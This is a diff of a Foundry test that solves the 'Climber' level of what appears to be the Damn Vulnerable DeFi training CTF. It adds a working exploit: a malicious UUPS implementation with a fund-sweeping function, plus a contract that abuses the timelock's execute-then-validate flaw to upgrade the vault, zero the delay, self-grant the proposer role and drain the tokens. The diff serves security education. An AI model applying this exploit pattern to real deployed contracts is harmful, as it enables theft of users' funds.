@@ -4,10 +4,22 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {ClimberVault} from "../../src/climber/ClimberVault.sol";
-import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
-import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
+import {
+    ClimberTimelock,
+    CallerNotTimelock,
+    PROPOSER_ROLE,
+    ADMIN_ROLE
+} from "../../src/climber/ClimberTimelock.sol";
+import {
+    ERC1967Proxy
+} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
-
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {
+    UUPSUpgradeable
+} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
+import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -43,7 +55,10 @@ contract ClimberChallenge is Test {
             address(
                 new ERC1967Proxy(
                     address(new ClimberVault()), // implementation
-                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
+                    abi.encodeCall(
+                        ClimberVault.initialize,
+                        (deployer, proposer, sweeper)
+                    ) // initialization data
                 )
             )
         );
@@ -85,7 +100,16 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        MaliciousImplementation newVault = new MaliciousImplementation();
+        ExploitTimelockExecute exploiter = new ExploitTimelockExecute(
+            vault,
+            timelock,
+            address(newVault)
+        );
+
+        exploiter.executeAttack();
+        vault.sweepFunds(address(token));
+        token.transfer(recovery, token.balanceOf(player));
     }
 
     /**
@@ -93,6 +117,85 @@ contract ClimberChallenge is Test {
      */
     function _isSolved() private view {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
-        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            VAULT_TOKEN_BALANCE,
+            "Not enough tokens in recovery account"
+        );
+    }
+}
+
+contract MaliciousImplementation is UUPSUpgradeable {
+    //Had to make our malicious implementation upgradable other wise ERC1967InvalidImplementation(0xce110ab5927CC46905460D930CCa0c6fB4666219)] revert will happen since vault the variable which holds the older implementation and will hold newer implementation is child of UUPSUpgradeable
+    // we have to define this fn because in UUPSUpgradeable this fn is virtual and abstract
+    function _authorizeUpgrade(address newImplementation) internal override {}
+
+    //we declare a fn with same signature of fn the og implementation
+    // we use it to transfer all funds proxy holds to us
+    function sweepFunds(address token) external {
+        SafeTransferLib.safeTransfer(
+            token,
+            msg.sender,
+            IERC20(token).balanceOf(address(this))
+        );
+    }
+}
+contract ExploitTimelockExecute {
+    ClimberVault immutable vault;
+    ClimberTimelock immutable timelock;
+    address immutable newVault;
+
+    address[] targets = new address[](4);
+    //will already have their value 0 by default which is what we want it to be so no need to initialize later
+    uint256[] values = new uint256[](4);
+    bytes[] dataElements = new bytes[](4);
+    bytes32 salt = keccak256("salt");
+
+    constructor(
+        ClimberVault _vault,
+        ClimberTimelock _timelock,
+        address _newVault
+    ) {
+        vault = _vault;
+        timelock = _timelock;
+        newVault = _newVault;
+    }
+
+    function executeAttack() external {
+        targets[0] = address(vault);
+        targets[1] = address(timelock);
+        targets[2] = address(timelock);
+        targets[3] = address(this);
+
+        //Upgrade vault's implementation with out malicious one
+        dataElements[0] = abi.encodeCall(
+            UUPSUpgradeable.upgradeToAndCall,
+            (newVault, "")
+        );
+        // Set the delay to zero so the operation can become ready
+        // before execute() performs its final readiness check.
+        dataElements[1] = abi.encodeCall(timelock.updateDelay, (0));
+        // The helper must be a proposer because it calls schedule()
+        // from maliciousScheduling().
+        //We grant this current exploiter contract proposer role so that it can schedule our batch for execution
+        dataElements[2] = abi.encodeCall(
+            AccessControl.grantRole,
+            (PROPOSER_ROLE, address(this))
+        );
+        /*
+
+        we make use of the timelock contract not following the cei pattern i.e execution happening before validating if the action is scheduled in the timelock Execute implementation 
+        we encode call of a separate fn maliciousScheduling which runs timelock.schedule(targets, values, dataElements, salt) inside
+        we do not encode timelock.schedule itslef because then we will have to pass datalements direclty in schedule and then also in execute 
+        which in turn makes it impossible for execute to pass same op id schedule passed bcos execute won't be able to pass the same dataelements
+        as schedule ever
+
+       */
+        dataElements[3] = abi.encodeCall(this.maliciousScheduling, ());
+
+        timelock.execute(targets, values, dataElements, salt);
+    }
+    function maliciousScheduling() external {
+        timelock.schedule(targets, values, dataElements, salt);
     }
 }
